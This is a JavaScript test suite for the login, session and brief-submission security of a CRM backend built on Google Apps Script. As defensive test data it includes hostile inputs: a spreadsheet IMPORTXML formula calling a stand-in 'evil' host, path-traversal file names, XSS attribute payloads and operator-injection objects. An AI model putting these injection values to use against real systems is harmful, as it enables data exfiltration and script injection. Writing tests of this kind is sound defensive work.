// Scenario tests for the CRM login & security in backend/Code.gs
const { create } = require('./gas-mock');
const CODE = process.argv[2] ? [process.argv[2]] : ['Code.gs', 'TestBriefs.gs'].map(f => require('path').join(__dirname, '../backend', f));
let pass = 0, fail = 0;
const results = [];
function t(name, fn) {
  try { fn(); pass++; results.push(['✓', name]); }
  catch (e) { fail++; results.push(['✗', name + ' — ' + e.message]); }
}
function eq(a, b, m) { if (a !== b) throw new Error((m || '') + ' expected ' + JSON.stringify(b) + ' got ' + JSON.stringify(a)); }
function ok(c, m) { if (!c) throw new Error(m || 'assertion failed'); }
const MIN = 60000;

function fresh(code = '48271593') {
  const g = create(CODE);
  g.props.NEW_CODE = code;
  g.ctx.setup();
  return g;
}
const otpOf = g => { const m = g.mails[g.mails.length - 1]; return (m.subject.match(/(\d{6})$/) || [])[1]; };
function signIn(g, extra = {}) {
  const a = g.post({ action: 'login', code: '48271593', ua: 'Test', ...extra });
  if (a.token) return a;
  const b = g.post({ action: 'verify', challenge: a.challenge, otp: otpOf(g), ua: 'Test', ...extra });
  return b;
}
function seedBrief(g, client = { name: 'Олена', email: 'o@example.com' }, extra = {}) {
  return g.post({ action: 'submit', mode: 'none', client, summary: { type: 'Лендинг' }, sections: [], fileCount: 1, html: '<p>x</p>', website: '', ...extra });
}

/* ---------- налаштування коду ---------- */
t('setup: код зберігається лише як хеш, NEW_CODE видаляється', () => {
  const g = fresh();
  ok(!('NEW_CODE' in g.props), 'NEW_CODE still present');
  ok(g.props.CODE_HASH && g.props.CODE_SALT, 'no hash');
  ok(!JSON.stringify(g.props).includes('48271593'), 'plain code in properties');
  ok(!g.logs.join(' ').includes('48271593'), 'plain code in logs');
});
t('setup: надто короткий код відхиляється', () => { const g = create(CODE); g.props.NEW_CODE = '12345'; let e; try { g.ctx.setup(); } catch (x) { e = x; } ok(e, 'accepted'); ok(!g.props.CODE_HASH); ok(!('NEW_CODE' in g.props), 'rejected code left in props'); });
t('setup: прості коди (111111, 123456, 654321, qwerty1) відхиляються', () => {
  for (const c of ['111111', '123456', '654321', '1234567890', 'qwerty1', 'stackup2026']) { const g = create(CODE); g.props.NEW_CODE = c; let e; try { g.ctx.setup(); } catch (x) { e = x; } ok(e, c + ' accepted'); }
});
t('setup: старий ADMIN_KEY видаляється і більше не відкриває кабінет', () => {
  const g = create(CODE); g.props.ADMIN_KEY = 'oldkey123'; g.props.NEW_CODE = '48271593'; g.ctx.setup();
  ok(!g.props.ADMIN_KEY);
  eq(g.post({ action: 'list', key: 'oldkey123' }).error, 'unauthorized');
  eq(g.get({ action: 'list', key: 'oldkey123' }).error, 'unauthorized');
});
t('без коду (не налаштовано) вхід неможливий', () => { const g = create(CODE); g.ctx.setup(); eq(g.post({ action: 'login', code: 'anything1' }).error, 'not configured'); });

/* ---------- вхід ---------- */
t('правильний код → лист з одноразовим кодом, токена ще немає', () => {
  const g = fresh(); const r = g.post({ action: 'login', code: '48271593', ua: 'Chrome · macOS' });
  ok(r.ok && r.step === 'otp' && r.challenge && !r.token, JSON.stringify(r));
  ok(/^\d{6}$/.test(otpOf(g)), 'no otp mail'); eq(g.mails[0].to, 'lana@example.com');
  ok(r.to.includes('•••@example.com'), 'email not masked');
});
t('код + правильний код із листа → сесія, список заявок відкривається', () => {
  const g = fresh(); seedBrief(g); const s = signIn(g);
  ok(s.token && s.token.length >= 40, 'no token');
  const l = g.post({ action: 'list', token: s.token }); ok(l.ok && l.items.length === 1, JSON.stringify(l));
  ok(!('token' in l.items[0]) && !('folderId' in l.items[0]), 'list leaks token/folderId');
});
t('невірний код → відмова без підказок', () => { const g = fresh(); const r = g.post({ action: 'login', code: '00000001' }); eq(r.ok, false); eq(r.error, 'bad code'); eq(g.mails.length, 0); });
t('порожній код / не рядок / масив / обʼєкт → відмова', () => {
  const g = fresh();
  for (const c of ['', null, 48271593, ['48271593'], { $ne: 1 }, true]) { g.props.LOCK_UNTIL = '0'; g.props.FAILS = '0'; } for (const c of ['', null, 48271593, ['48271593'], { $ne: 1 }, true]) { g.props.FAILS = '0'; eq(g.post({ action: 'login', code: c }).error, 'bad code', String(c)); }
});
t('дуже довгий код (DoS на хешуванні) → відмова', () => { const g = fresh(); eq(g.post({ action: 'login', code: 'x'.repeat(100000) }).error, 'bad code'); });
t('код з пробілами / іншим регістром не підходить', () => { const g = fresh('Ab48271593'); eq(g.post({ action: 'login', code: 'ab48271593' }).error, 'bad code'); eq(g.post({ action: 'login', code: ' Ab48271593' }).error, 'bad code'); });
t('невірний код із листа → відмова; правильний після цього працює', () => {
  const g = fresh(); const a = g.post({ action: 'login', code: '48271593' });
  const wrong = otpOf(g) === '000000' ? '111111' : '000000';
  eq(g.post({ action: 'verify', challenge: a.challenge, otp: wrong }).error, 'bad otp');
  ok(g.post({ action: 'verify', challenge: a.challenge, otp: otpOf(g) }).token);
});
t('код із листа одноразовий: вдруге не спрацьовує', () => {
  const g = fresh(); const a = g.post({ action: 'login', code: '48271593' }); const otp = otpOf(g);
  ok(g.post({ action: 'verify', challenge: a.challenge, otp }).token);
  eq(g.post({ action: 'verify', challenge: a.challenge, otp }).error, 'expired');
});
t('код із листа діє лише 10 хв', () => {
  const g = fresh(); const a = g.post({ action: 'login', code: '48271593' }); const otp = otpOf(g);
  g.clock.offset += 11 * MIN; eq(g.post({ action: 'verify', challenge: a.challenge, otp }).error, 'expired');
});
t('повторне «Далі»: підходить код з будь-якого свіжого листа, але лише з правильним кодом кабінету', () => {
  const g = fresh(); g.post({ action: 'login', code: '48271593' }); const otp1 = otpOf(g);
  const b = g.post({ action: 'login', code: '48271593' });
  eq(g.post({ action: 'verify', challenge: 'forged-challenge', otp: otp1 }).error, 'expired');
  ok(g.post({ action: 'verify', challenge: b.challenge, otp: otp1 }).token, 'older mail code rejected');
});
t('старий код із листа не діє після 10 хв навіть з новим викликом', () => {
  const g = fresh(); g.post({ action: 'login', code: '48271593' }); const otp1 = otpOf(g);
  g.clock.offset += 11 * MIN; const b = g.post({ action: 'login', code: '48271593' });
  if (otpOf(g) !== otp1) eq(g.post({ action: 'verify', challenge: b.challenge, otp: otp1 }).error, 'bad otp');
});
t('без коду кабінету не можна одразу вгадувати код із листа', () => { const g = fresh(); eq(g.post({ action: 'verify', challenge: '', otp: '123456' }).error, 'expired'); });

/* ---------- підбір ---------- */
t('5 невдалих спроб → блокування 15 хв + лист вам', () => {
  const g = fresh();
  for (let i = 0; i < 4; i++) eq(g.post({ action: 'login', code: 'wrong' + i }).error, 'bad code');
  const r = g.post({ action: 'login', code: 'wrong5' }); eq(r.error, 'bad code');
  const l = g.post({ action: 'login', code: '48271593' }); ok(/^locked:\d+$/.test(l.error), 'not locked: ' + l.error);
  ok(g.mails.some(m => /заблоковано на 15 хв/.test(m.subject)), 'no lock mail');
});
t('під час блокування навіть правильний код не пускає', () => {
  const g = fresh(); for (let i = 0; i < 5; i++) g.post({ action: 'login', code: 'bad' + i });
  ok(/^locked/.test(g.post({ action: 'login', code: '48271593' }).error));
  g.clock.offset += 14 * MIN; ok(/^locked/.test(g.post({ action: 'login', code: '48271593' }).error));
  g.clock.offset += 2 * MIN; eq(g.post({ action: 'login', code: '48271593' }).step, 'otp');
});
t('повторне блокування довше: 15 → 30 → 60 хв', () => {
  const g = fresh(); const mins = [];
  for (let round = 0; round < 3; round++) {
    for (let i = 0; i < 5; i++) g.post({ action: 'login', code: 'bad' + i });
    const until = +g.props.LOCK_UNTIL; mins.push(Math.round((until - Date.now() - g.clock.offset) / MIN));
    g.clock.offset = until - Date.now() + 1000;
  }
  eq(mins.join(','), '15,30,60');
});
t('невірні коди з листа теж рахуються як спроби підбору', () => {
  const g = fresh();
  for (let i = 0; i < 5; i++) { const a = g.post({ action: 'login', code: '48271593' }); g.post({ action: 'verify', challenge: a.challenge, otp: otpOf(g) === '999999' ? '999998' : '999999' }); }
  ok(/^locked/.test(g.post({ action: 'login', code: '48271593' }).error));
});
t('5 невдалих кодів із листа → цей виклик анульовано', () => {
  const g = fresh(); g.props.FAILS = '0';
  const a = g.post({ action: 'login', code: '48271593' }); const otp = otpOf(g);
  for (let i = 0; i < 5; i++) { g.props.LOCK_UNTIL = '0'; g.post({ action: 'verify', challenge: a.challenge, otp: otp === '999999' ? '999998' : '999999' }); }
  g.props.LOCK_UNTIL = '0'; eq(g.post({ action: 'verify', challenge: a.challenge, otp }).error, 'expired');
});
t('успішний вхід скидає лічильник невдалих спроб', () => {
  const g = fresh(); for (let i = 0; i < 4; i++) g.post({ action: 'login', code: 'bad' + i });
  ok(signIn(g).token); eq(g.props.FAILS, '0');
});
t('unlockLogin() знімає блокування', () => { const g = fresh(); for (let i = 0; i < 5; i++) g.post({ action: 'login', code: 'b' + i }); g.ctx.unlockLogin(); eq(g.post({ action: 'login', code: '48271593' }).step, 'otp'); });

/* ---------- сесії ---------- */
t('без токена / з вигаданим токеном кабінет закритий (list, get, update, stages)', () => {
  const g = fresh(); const b = seedBrief(g);
  for (const tok of [undefined, '', 'x', 'A'.repeat(55), { $gt: '' }, ['a']])
    for (const a of [{ action: 'list' }, { action: 'get', id: b.id }, { action: 'update', id: b.id, status: 'done' }, { action: 'stages', stages: [{ id: 'new', name: 'X' }] }])
      eq(g.post({ ...a, token: tok }).error, 'unauthorized', a.action + ' ' + JSON.stringify(tok));
});
t('GET-запити більше не віддають дані (токен не потрапляє в адресу)', () => { const g = fresh(); const s = signIn(g); eq(g.get({ action: 'list', token: s.token }).error, 'unauthorized'); eq(g.get({ action: 'ping' }).ok, true); });
t('клієнтський токен брифу не відкриває кабінет', () => { const g = fresh(); const b = seedBrief(g); eq(g.post({ action: 'list', token: b.token }).error, 'unauthorized'); });
t('сесія діє 24 год від входу: годинами без дій не злітає, після 24 год — вихід', () => {
  const g = fresh(); const s = signIn(g);
  g.clock.offset += 8 * 3600000; ok(g.post({ action: 'list', token: s.token }).ok, '8h idle dropped');
  g.clock.offset += 15 * 3600000; ok(g.post({ action: 'list', token: s.token }).ok, '23h dropped');
  g.clock.offset += 61 * MIN; eq(g.post({ action: 'list', token: s.token }).error, 'unauthorized');
});
t('активність не продовжує сесію понад 24 год', () => { const g = fresh(); const s = signIn(g); for (let i = 0; i < 50; i++) { g.clock.offset += 29 * MIN; g.post({ action: 'list', token: s.token }); } eq(g.post({ action: 'list', token: s.token }).error, 'unauthorized'); });
t('сесій не більше 10: найстаріша відключається', () => { const g = fresh(); g.props.TWO_FACTOR = 'off'; const first = g.post({ action: 'login', code: '48271593' }).token; for (let i = 0; i < 10; i++) g.post({ action: 'login', code: '48271593' }); eq(g.post({ action: 'list', token: first }).error, 'unauthorized'); });
t('вихід скасовує сесію на сервері', () => { const g = fresh(); const s = signIn(g); g.post({ action: 'logout', token: s.token }); eq(g.post({ action: 'list', token: s.token }).error, 'unauthorized'); });
t('«Вийти на всіх пристроях» скасовує всі сесії і довірені пристрої', () => {
  const g = fresh(); const a = signIn(g, { trust: true }); const b = signIn(g);
  ok(a.device, 'no device token');
  g.post({ action: 'logoutAll', token: b.token });
  eq(g.post({ action: 'list', token: a.token }).error, 'unauthorized'); eq(g.post({ action: 'list', token: b.token }).error, 'unauthorized');
  eq(g.post({ action: 'login', code: '48271593', device: a.device }).step, 'otp', 'device still trusted');
});
t('зміна коду (setup з NEW_CODE) викидає всіх', () => { const g = fresh(); const s = signIn(g); g.props.NEW_CODE = '90817263'; g.ctx.setup(); eq(g.post({ action: 'list', token: s.token }).error, 'unauthorized'); eq(g.post({ action: 'login', code: '48271593' }).error, 'bad code'); });
t('токени сесій не зберігаються у відкритому вигляді', () => { const g = fresh(); const s = signIn(g); ok(!JSON.stringify(g.cacheStore).includes(s.token)); ok(!JSON.stringify(g.props).includes(s.token)); });

/* ---------- довірений пристрій ---------- */
t('довірений пристрій: код без листа, але код кабінету все одно потрібен', () => {
  const g = fresh(); const a = signIn(g, { trust: true }); const n = g.mails.length;
  const r = g.post({ action: 'login', code: '48271593', device: a.device }); ok(r.token, 'trusted login failed');
  ok(g.mails.length === n + 1 && /Вхід у CRM/.test(g.mails[n].subject), 'no login alert mail');
  eq(g.post({ action: 'login', code: 'wrongcode', device: a.device }).error, 'bad code');
});
t('довіра закінчується через 30 днів', () => { const g = fresh(); const a = signIn(g, { trust: true }); g.clock.offset += 31 * 864e5; eq(g.post({ action: 'login', code: '48271593', device: a.device }).step, 'otp'); });
t('вигаданий токен пристрою не дає пропустити лист', () => { const g = fresh(); signIn(g, { trust: true }); eq(g.post({ action: 'login', code: '48271593', device: 'Z'.repeat(55) }).step, 'otp'); });
t('не більше 5 довірених пристроїв', () => { const g = fresh(); const devs = []; for (let i = 0; i < 7; i++) devs.push(signIn(g, { trust: true }).device); eq(JSON.parse(g.props.TRUSTED).length, 5); eq(g.post({ action: 'login', code: '48271593', device: devs[0] }).step, 'otp'); ok(g.post({ action: 'login', code: '48271593', device: devs[6] }).token); });

/* ---------- публічний бриф ---------- */
t('Telegram: connectTelegram запам’ятовує чат, нова заявка приходить push-повідомленням з кнопкою в CRM', () => {
  const g = fresh(); g.props.TG_TOKEN = '123:abc'; g.props.ADMIN_URL = 'https://stackup.studio/admin.html';
  g.ctx.connectTelegram(); eq(g.props.TG_CHAT, '777');
  const b = seedBrief(g); g.post({ action: 'finish', id: b.id, token: b.token, fileCount: 0 });
  const sent = g.fetches.filter(f => /sendMessage/.test(f.url)).map(f => JSON.parse(f.o.payload));
  ok(sent.length === 2 && /Нова заявка/.test(sent[1].text), JSON.stringify(sent));
  eq(sent[1].reply_markup.inline_keyboard[0][0].url, 'https://stackup.studio/admin.html#' + b.id);
});
t('без TG_TOKEN бриф працює і нічого не надсилає в Telegram', () => {
  const g = fresh(); const b = seedBrief(g); ok(g.post({ action: 'finish', id: b.id, token: b.token }).ok); eq(g.fetches.length, 0);
});
t('бриф працює як раніше: submit → file → finish → лист', () => {
  const g = fresh(); const b = seedBrief(g); ok(b.ok && b.token, JSON.stringify(b));
  ok(g.post({ action: 'file', id: b.id, token: b.token, field: 'specFiles', name: 'tz.pdf', type: 'application/pdf', data: Buffer.from('pdf').toString('base64') }).ok);
  ok(g.post({ action: 'finish', id: b.id, token: b.token, fileCount: 1 }).ok);
  ok(g.mails.some(m => /Нова заявка/.test(m.subject)));
});
t('після finish токен клієнта більше не додає файли', () => {
  const g = fresh(); const b = seedBrief(g); g.post({ action: 'finish', id: b.id, token: b.token });
  eq(g.post({ action: 'file', id: b.id, token: b.token, name: 'x', data: 'eA==' }).error, 'upload window closed');
});
t('чужий/підроблений токен брифу не додає файли', () => { const g = fresh(); const b = seedBrief(g); eq(g.post({ action: 'file', id: b.id, token: 'forged', name: 'x', data: 'eA==' }).error, 'bad id or token'); });
t('токен брифу в таблиці зберігається як хеш', () => { const g = fresh(); const b = seedBrief(g); ok(!JSON.stringify(g.sheets).includes(b.token)); });
t('формули в полях клієнта не виконуються в таблиці', () => {
  const g = fresh(); seedBrief(g, { name: '=IMPORTXML("http://evil","//a")', email: 'a@b.co', company: '+cmd', phone: '@SUM(1)' });
  const row = g.sheets['Заявки'][1];
  ok(row.every(v => !(typeof v === 'string' && /^[=+@]/.test(v))), 'formula stored raw: ' + JSON.stringify(row));
  const s = signIn(g); const l = g.post({ action: 'list', token: s.token }); eq(l.items[0].name, '=IMPORTXML("http://evil","//a")');
});
t('нотатки з формулою теж зберігаються як текст', () => { const g = fresh(); const b = seedBrief(g); const s = signIn(g); g.post({ action: 'update', token: s.token, id: b.id, notes: '=HYPERLINK("x")' }); const row = g.sheets['Заявки'][1]; ok(row[13].text === '=HYPERLINK("x")', JSON.stringify(row[13])); });
t('ліміт: не більше 30 брифів на годину', () => { const g = fresh(); let last; for (let i = 0; i < 31; i++) last = seedBrief(g, { name: 'n' + i, email: i + '@x.co' }); eq(last.error, 'too many requests'); g.clock.offset += 61 * MIN; ok(seedBrief(g).ok); });
t('невалідний email у брифі відхиляється', () => { const g = fresh(); eq(seedBrief(g, { name: 'x', email: 'not-an-email' }).error, 'bad email'); });
t('honeypot: бот із заповненим прихованим полем нічого не створює', () => { const g = fresh(); g.post({ action: 'submit', website: 'spam', client: { name: 'b', email: 'b@b.co' } }); eq(g.sheets['Заявки'].length, 1); });
t('небезпечний тип файлу (text/html) зберігається як бінарний', () => {
  const g = fresh(); const b = seedBrief(g); g.post({ action: 'file', id: b.id, token: b.token, field: 'x', name: 'a.html', type: 'text/html', data: Buffer.from('<script>').toString('base64') });
  const all = Object.values(g.drive).flatMap(f => f.files); ok(all.find(x => x.name === 'a.html').type === 'application/octet-stream');
});
t('шлях у назві файлу/поля не виходить за папку заявки', () => { const g = fresh(); const b = seedBrief(g); g.post({ action: 'file', id: b.id, token: b.token, field: '../../root', name: '../../x.pdf', data: 'eA==' }); const names = Object.values(g.drive).flatMap(f => f.files.map(x => x.name).concat([f.name])); ok(!names.some(n => n.includes('/')), names.join(',')); });

/* ---------- кабінет: перевірка даних ---------- */
t('неіснуючий етап / архів / шкідливий tone у колонках відфільтровано', () => {
  const g = fresh(); const s = signIn(g); const b = seedBrief(g);
  eq(g.post({ action: 'update', token: s.token, id: b.id, status: '<img onerror=x>' }).error, 'bad status');
  g.post({ action: 'stages', token: s.token, stages: [{ id: 'new', name: 'Нові', tone: 'acid' }, { id: 'x"><svg onload=1>', name: 'Bad', tone: '" onmouseover="x' }] });
  const st = JSON.parse(g.props.STAGES); ok(st.every(x => /^[a-z0-9_-]+$/.test(x.id) && ['acid', 'line'].includes(x.tone)), JSON.stringify(st));
});
t('помилки сервера не розкривають деталей реалізації', () => { const g = fresh(); const s = signIn(g); eq(g.post('{not json').error, 'server error'); eq(g.post({ action: 'get', token: s.token, id: 'nope' }).error, 'not found'); });
t('вимкнена 2FA (TWO_FACTOR=off): вхід лише за кодом, блокування працює', () => { const g = fresh(); g.props.TWO_FACTOR = 'off'; ok(g.post({ action: 'login', code: '48271593' }).token); for (let i = 0; i < 5; i++) g.post({ action: 'login', code: 'b' + i }); ok(/^locked/.test(g.post({ action: 'login', code: '48271593' }).error)); });
t('журнал входів ведеться в аркуші «Журнал»', () => { const g = fresh(); g.post({ action: 'login', code: 'bad' }); signIn(g); const log = g.sheets['Журнал'].map(r => r[1]); ok(log.includes('bad-code') && log.includes('login'), log.join(',')); });

t('старий формат хешу (2000 раундів) приймається і тихо оновлюється до швидкого', () => {
  const g = fresh(); const salt = g.props.CODE_SALT;
  g.props.CODE_HASH = g.ctx.stretchLegacy('48271593', salt); delete g.props.CODE_ROUNDS;
  eq(g.post({ action: 'login', code: 'wrong123' }).error, 'bad code');
  eq(g.post({ action: 'login', code: '48271593' }).step, 'otp');
  eq(g.props.CODE_ROUNDS, '250'); eq(g.post({ action: 'login', code: '48271593' }).step, 'otp');
});

t('тестові заявки: seedTestBriefs додає 10 різних, без листів, повторно не дублює; removeTestBriefs прибирає лише їх', () => {
  const g = fresh(); const s = signIn(g); const mails = g.mails.length;
  const real = g.post({ action: 'submit', client: { name: 'Real', email: 'r@x.io' }, summary: {} });
  g.ctx.seedTestBriefs(); g.ctx.seedTestBriefs();
  const items = g.post({ action: 'list', token: s.token }).items;
  eq(items.length, 11); eq(g.mails.length, mails);
  const t = items.filter(x => /-TEST\d+$/.test(x.id)); eq(t.length, 10);
  ok(new Set(t.map(x => x.status)).size >= 4, 'statuses'); ok(t.every(x => !x.token && !x.folderId));
  const d = g.post({ action: 'get', token: s.token, id: t.find(x => x.files > 1).id });
  ok(d.ok && d.record.sections.length && d.files.length > 1, JSON.stringify(d).slice(0, 200));
  g.ctx.removeTestBriefs();
  const left = g.post({ action: 'list', token: s.token }).items; eq(left.length, 1); eq(left[0].id, real.id);
});

for (const [m, n] of results) console.log(m, n);
console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
